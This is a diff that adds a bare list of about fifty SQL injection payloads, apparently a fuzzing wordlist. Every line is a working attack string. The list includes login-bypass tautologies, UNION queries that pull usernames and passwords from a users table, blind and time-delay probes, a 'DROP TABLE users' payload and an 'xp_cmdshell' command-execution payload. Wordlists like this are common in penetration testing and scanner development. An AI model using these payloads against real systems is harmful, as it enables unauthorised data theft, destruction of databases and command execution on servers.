@@ -1,0 +1,51 @@
+' OR 1=1--
+' OR '1'='1'--
+' OR 1=1#
+admin'--
+' OR 1=1/*
+" OR 1=1--
+" OR "1"="1"--
+' OR ''='
+' OR 1=1 LIMIT 1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+' UNION SELECT username,password FROM users--
+' AND 1=1--
+' AND 1=2--
+' AND SUBSTRING(@@version,1,1)='5'--
+' ORDER BY 1--
+' ORDER BY 10--
+1' AND '1'='1
+1' AND '1'='2
+' OR 'x'='x
+') OR ('1'='1
+')) OR (('1'='1
+' OR 1=1; DROP TABLE users--
+'; EXEC xp_cmdshell('dir')--
+' WAITFOR DELAY '0:0:5'--
+1; SELECT * FROM users
+' AND (SELECT COUNT(*) FROM users)>0--
+' OR EXISTS(SELECT * FROM users)--
+admin' /*
+admin' #
+' OR 1=1 -- -
+' OR 1 LIKE 1--
+' OR 'a'='a
+'-'
+' '
+'&'
+'^'
+'*'
+' OR ''-'
+' OR '' '
+' OR ''&'
+' OR ''^'
+' OR ''*'
+1' ORDER BY 1,2,3--
+1' GROUP BY 1,2,3--
+' HAVING 1=1--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=1 UNION SELECT 1,2,3--
